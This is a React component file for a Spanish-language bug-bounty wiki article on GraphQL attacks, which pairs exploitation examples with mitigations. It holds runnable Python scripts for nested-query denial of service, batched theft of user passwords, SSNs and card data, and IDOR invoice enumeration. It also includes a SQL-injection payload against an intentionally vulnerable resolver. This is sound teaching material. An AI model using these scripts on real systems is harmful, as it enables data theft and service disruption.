/**
 * GRAPHQL INJECTION
 * Explotar APIs GraphQL mal configuradas
 */

import { ReactNode } from 'react';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  AlertTip,
  CodeBlock,
  TerminalOutput,
  HighlightBox,
  ListItem
} from '@/components/WikiArticleComponents';
import { Network, Database, Shield, AlertTriangle, ArrowRight } from 'lucide-react';
import Link from 'next/link';

interface ArticleContentProps {
  locale: string;
}

export default function GraphQLInjectionContent({ locale }: ArticleContentProps): ReactNode {
  return (
    <>
      <Section id="introduccion" title="GraphQL - El Nuevo Vector de Ataque">
        <Paragraph>
          <Strong>GraphQL</Strong> es un lenguaje de consultas para APIs que permite a los clientes 
          solicitar exactamente los datos que necesitan. Pero esta flexibilidad introduce nuevos 
          vectores de ataque: <Strong>DoS via queries complejas</Strong>, <Strong>exfiltración masiva</Strong>, 
          y <Strong>bypass de rate limiting</Strong>.
        </Paragraph>

        <AlertDanger title="Vulnerabilidades Específicas de GraphQL">
          <ul className="mt-2 space-y-1">
            <ListItem>🔄 Query depth attacks (queries recursivas)</ListItem>
            <ListItem>💣 Resource exhaustion (batching abuse)</ListItem>
            <ListItem>🔍 Introspection enabled (schema disclosure)</ListItem>
            <ListItem>📊 Field duplication attacks</ListItem>
            <ListItem>🎯 IDOR via directos object access</ListItem>
            <ListItem>💉 SQL injection en resolvers</ListItem>
          </ul>
        </AlertDanger>
      </Section>

      <Section id="introspection" title="1. Schema Introspection - Mapear la API">
        <Paragraph>
          Por defecto, GraphQL permite <Strong>introspection</Strong>: consultar el schema completo 
          incluyendo queries, mutations, tipos y campos privados.
        </Paragraph>

        <CodeBlock
          language="graphql"
          title="Query de introspection completa"
          code={`query IntrospectionQuery {
  __schema {
    queryType {
      name
      fields {
        name
        description
        args {
          name
          type {
            name
            kind
          }
        }
      }
    }
    mutationType {
      name
      fields {
        name
        args {
          name
          type {
            name
          }
        }
      }
    }
    types {
      name
      kind
      fields {
        name
        type {
          name
        }
      }
    }
  }
}`}
        />

        <TerminalOutput title="Resultado - Schema completo expuesto">
          {`{
  "data": {
    "__schema": {
      "types": [
        {
          "name": "User",
          "fields": [
            {"name": "id"},
            {"name": "email"},
            {"name": "password"},  ← ¡Campo sensible expuesto!
            {"name": "ssn"},       ← ¡Número seguro social!
            {"name": "creditCard"}
          ]
        },
        {
          "name": "AdminPanel",   ← ¡Tipo admin descubierto!
          "fields": [...]
        }
      ]
    }
  }
}`}
        </TerminalOutput>

        <AlertWarning>
          Con introspection, un atacante mapea TODA la API y descubre endpoints 
          "ocultos" como <InlineCode>deleteAllUsers</InlineCode> o <InlineCode>promoteToAdmin</InlineCode>.
        </AlertWarning>
      </Section>

      <Section id="depth-attack" title="2. Query Depth Attack - DoS">
        <Paragraph>
          GraphQL permite queries anidadas. Un atacante puede crear queries extremadamente 
          profundas que consumen CPU/memoria.
        </Paragraph>

        <CodeBlock
          language="graphql"
          title="Query maliciosa - 100 niveles de profundidad"
          code={`query DeepQuery {
  user(id: 1) {
    posts {
      author {
        posts {
          author {
            posts {
              author {
                posts {
                  # ... repetir 100 veces
                }
              }
            }
          }
        }
      }
    }
  }
}`}
        />

        <CodeBlock
          language="python"
          title="Script - Generar query de profundidad N"
          code={`def generate_deep_query(depth=100):
    query = "query DeepAttack { user(id: 1) { "
    
    for i in range(depth):
        query += "posts { author { "
    
    # Cerrar todos los brackets
    query += "id " + "} " * (depth * 2) + "} }"
    
    return query

# Generar query de 1000 niveles
malicious_query = generate_deep_query(1000)

# Enviar a API GraphQL
import requests
response = requests.post(
    'https://target.com/graphql',
    json={'query': malicious_query}
)

# Resultado: Servidor timeout o crash por consumo de memoria`}
        />
      </Section>

      <Section id="batching-abuse" title="3. Batching Abuse - Bypass Rate Limiting">
        <Paragraph>
          GraphQL permite enviar <Strong>múltiples queries en un solo request</Strong>. 
          Esto puede usarse para bypassear rate limiting basado en número de requests.
        </Paragraph>

        <CodeBlock
          language="graphql"
          title="Batch de 1000 queries en 1 request"
          code={`[
  {"query": "query { user(id: 1) { email password } }"},
  {"query": "query { user(id: 2) { email password } }"},
  {"query": "query { user(id: 3) { email password } }"},
  ...
  {"query": "query { user(id: 1000) { email password } }"}
]`}
        />

        <CodeBlock
          language="python"
          title="Script - Exfiltrar 10,000 usuarios con batching"
          code={`import requests

GRAPHQL_URL = "https://target.com/graphql"

# Generar batch de queries
def generate_batch(start_id, batch_size=100):
    queries = []
    for user_id in range(start_id, start_id + batch_size):
        queries.append({
            "query": f"""
                query {{
                    user(id: {user_id}) {{
                        id
                        email
                        password
                        ssn
                        creditCard
                    }}
                }}
            """
        })
    return queries

# Exfiltrar 10,000 usuarios en batches de 100
all_users = []

for batch_start in range(1, 10000, 100):
    batch = generate_batch(batch_start, 100)
    
    # 1 request = 100 queries
    response = requests.post(GRAPHQL_URL, json=batch)
    
    if response.status_code == 200:
        all_users.extend(response.json())
        print(f"[+] Exfiltrated batch {batch_start}-{batch_start+99}")
    
    time.sleep(1)  # Rate limit es por request, no por query

print(f"[+] Total users stolen: {len(all_users)}")`}
        />

        <AlertDanger>
          En 100 requests HTTP, el atacante exfiltró 10,000 registros de usuarios. 
          Rate limiters tradicionales (requests/segundo) son inefectivos.
        </AlertDanger>
      </Section>

      <Section id="field-duplication" title="4. Field Duplication - Resource Exhaustion">
        <CodeBlock
          language="graphql"
          title="Query con 10,000 campos idénticos"
          code={`query FieldSpam {
  user(id: 1) {
    email1: email
    email2: email
    email3: email
    email4: email
    ...
    email10000: email
  }
}`}
        />

        <CodeBlock
          language="python"
          title="Generar query con alias duplicados"
          code={`def generate_field_spam(field_name='email', count=10000):
    query = "query FieldSpam { user(id: 1) { "
    
    for i in range(count):
        query += f"{field_name}{i}: {field_name} "
    
    query += "} }"
    return query

# Generar query con 50,000 aliases
malicious = generate_field_spam('email', 50000)

# Resultado: Servidor consume GB de memoria procesando respuesta`}
        />
      </Section>

      <Section id="idor-graphql" title="5. IDOR en GraphQL">
        <Paragraph>
          GraphQL facilita IDOR porque permite acceso directo a objetos por ID sin 
          pasar por controladores intermedios.
        </Paragraph>

        <CodeBlock
          language="graphql"
          title="Query vulnerable - Sin validación de ownership"
          code={`query GetInvoice {
  invoice(id: 12345) {  ← Cambiar ID a cualquier valor
    id
    total
    creditCard
    billingAddress
    items {
      name
      price
    }
  }
}`}
        />

        <CodeBlock
          language="python"
          title="Enumerar todas las facturas"
          code={`import requests

GRAPHQL_URL = "https://target.com/graphql"

def enumerate_invoices(start=1, end=10000):
    invoices = []
    
    for invoice_id in range(start, end):
        query = f"""
        query {{
            invoice(id: {invoice_id}) {{
                id
                userId
                total
                creditCard
            }}
        }}
        """
        
        response = requests.post(GRAPHQL_URL, json={'query': query})
        
        if response.status_code == 200:
            data = response.json()['data']['invoice']
            
            if data:
                print(f"[!] IDOR: Invoice {invoice_id} belongs to user {data['userId']}")
                invoices.append(data)
    
    return invoices

# Exfiltrar 10,000 facturas
stolen_invoices = enumerate_invoices(1, 10000)`}
        />
      </Section>

      <Section id="sql-injection-resolver" title="6. SQL Injection en Resolvers">
        <CodeBlock
          language="javascript"
          title="Resolver vulnerable con concatenación SQL"
          code={`const resolvers = {
  Query: {
    searchUsers: async (parent, args, context) => {
      const { query } = args;
      
      // ❌ VULNERABLE - Concatenación directa
      const sql = \`
        SELECT * FROM users 
        WHERE username LIKE '%\${query}%' 
        OR email LIKE '%\${query}%'
      \`;
      
      return await db.query(sql);
    }
  }
};`}
        />

        <CodeBlock
          language="graphql"
          title="Payload GraphQL con SQLi"
          code={`query SearchUsers {
  searchUsers(query: "admin' UNION SELECT password, email, ssn FROM admins--") {
    id
    username
    email
  }
}`}
        />

        <AlertWarning>
          El resolver ejecuta: <InlineCode>SELECT * FROM users WHERE username LIKE '%admin' UNION SELECT...%'</InlineCode>
        </AlertWarning>
      </Section>

      <Section id="herramientas" title="7. Herramientas de Testing">
        <Subsection title="GraphQL Voyager">
          <CodeBlock
            language="bash"
            title="Visualizar schema GraphQL"
            code={`# Instalar
npm install -g graphql-voyager

# Usar online
https://graphql-kit.com/graphql-voyager/

# Input: URL del endpoint GraphQL
# Output: Diagrama visual del schema completo`}
          />
        </Subsection>

        <Subsection title="InQL - Burp Extension">
          <AlertTip>
            <Strong>InQL</Strong> es una extensión de Burp Suite para testing de GraphQL:
            <ul className="mt-2 space-y-1">
              <ListItem>Introspection automática</ListItem>
              <ListItem>Generación de queries de prueba</ListItem>
              <ListItem>Detección de IDORs</ListItem>
              <ListItem>Fuzzing de parámetros</ListItem>
            </ul>
          </AlertTip>
        </Subsection>

        <Subsection title="GraphQLmap">
          <CodeBlock
            language="bash"
            title="GraphQLmap - Exploitation automática"
            code={`git clone https://github.com/swisskyrepo/GraphQLmap
cd GraphQLmap
python3 graphqlmap.py -u https://target.com/graphql

# Comandos disponibles:
dump_new    # Introspection completa
dump_old    # Introspection legacy
nosqli      # Test NoSQL injection
sqli        # Test SQL injection
exec        # Command injection`}
          />
        </Subsection>
      </Section>

      <Section id="mitigacion" title="Mitigación Completa">
        <AlertDanger title="✅ Configuración Segura de GraphQL">
          Implementar todas estas protecciones.
        </AlertDanger>

        <Subsection title="1. Deshabilitar Introspection en Producción">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Apollo Server sin introspection"
            code={`const { ApolloServer } = require('apollo-server');

const server = new ApolloServer({
  typeDefs,
  resolvers,
  
  // ✅ Deshabilitar introspection en producción
  introspection: process.env.NODE_ENV !== 'production',
  
  // ✅ Deshabilitar playground en producción
  playground: process.env.NODE_ENV !== 'production',
});`}
          />
        </Subsection>

        <Subsection title="2. Query Depth Limiting">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Limitar profundidad de queries"
            code={`const depthLimit = require('graphql-depth-limit');

const server = new ApolloServer({
  typeDefs,
  resolvers,
  
  validationRules: [
    // ✅ Máximo 5 niveles de profundidad
    depthLimit(5)
  ]
});

// Query con 6 niveles será rechazada automáticamente`}
          />
        </Subsection>

        <Subsection title="3. Query Complexity Analysis">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Calcular costo de query"
            code={`const { createComplexityLimitRule } = require('graphql-validation-complexity');

const server = new ApolloServer({
  typeDefs,
  resolvers,
  
  validationRules: [
    createComplexityLimitRule(1000, {
      // Asignar costos a campos
      scalarCost: 1,
      objectCost: 10,
      listFactor: 10,
      
      // Callbacks para costos dinámicos
      onCost: (cost) => {
        console.log(\`Query cost: \${cost}\`);
      }
    })
  ]
});

// Ejemplo:
// user { posts { comments } } = 10 + 10*10 + 10*10*10 = 1110
// Si > 1000, query es rechazada`}
          />
        </Subsection>

        <Subsection title="4. Rate Limiting por Query Count">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Limitar batching"
            code={`const { ApolloServer } = require('apollo-server-express');
const rateLimit = require('express-rate-limit');

// ✅ Middleware para contar queries en batch
app.use('/graphql', (req, res, next) => {
  const operations = Array.isArray(req.body) ? req.body.length : 1;
  
  // Limitar a máximo 10 queries por batch
  if (operations > 10) {
    return res.status(400).json({
      error: 'Too many operations in batch (max 10)'
    });
  }
  
  // Aplicar rate limit basado en número de queries
  req.rateLimit = {
    weight: operations
  };
  
  next();
});

// Rate limiter que considera peso de batch
const limiter = rateLimit({
  windowMs: 60 * 1000,  // 1 minuto
  max: (req) => 100 / (req.rateLimit?.weight || 1),
  message: 'Too many queries'
});

app.use('/graphql', limiter);`}
          />
        </Subsection>

        <Subsection title="5. Validación de Ownership en Resolvers">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Verificar permisos"
            code={`const resolvers = {
  Query: {
    invoice: async (parent, args, context) => {
      const { id } = args;
      const currentUserId = context.user.id;
      
      // ✅ SEGURO - Buscar con ownership check
      const invoice = await db.invoices.findOne({
        where: {
          id: id,
          userId: currentUserId  // ← Verificar ownership
        }
      });
      
      if (!invoice) {
        throw new Error('Invoice not found');
      }
      
      return invoice;
    }
  }
};`}
          />
        </Subsection>

        <Subsection title="6. Prepared Statements en Resolvers">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Prevenir SQLi"
            code={`const resolvers = {
  Query: {
    searchUsers: async (parent, args, context) => {
      const { query } = args;
      
      // ✅ SEGURO - Usar placeholders
      const sql = \`
        SELECT * FROM users 
        WHERE username LIKE ? 
        OR email LIKE ?
      \`;
      
      const searchPattern = \`%\${query}%\`;
      
      return await db.query(sql, [searchPattern, searchPattern]);
    }
  }
};`}
          />
        </Subsection>
      </Section>

      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Siguiente: Prototype Pollution</h3>
        <Link
          href={`/${locale}/wiki/bug-bounty/prototype-pollution`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-orange-600 to-red-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-orange-500/50 transition-all"
        >
          <span>Explotar prototipos de JavaScript</span>
          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
        </Link>
      </div>
    </>
  );
}
